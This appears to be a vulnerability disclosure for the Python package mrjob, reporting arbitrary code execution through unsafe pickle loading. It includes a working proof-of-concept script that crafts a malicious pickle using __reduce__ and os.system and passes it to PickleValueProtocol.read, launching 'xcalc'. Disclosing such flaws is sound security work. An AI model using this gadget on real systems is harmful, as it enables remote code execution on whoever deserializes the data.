# Description
mrjob is a Python 2.7/3.4+ package that helps you write and run Hadoop Streaming jobs.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install mrjob')
from mrjob import protocol
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
protocol.PickleValueProtocol.read(dumps,dumps)
```
* `pip3 install mrjob`
* `python3 exploit.py`
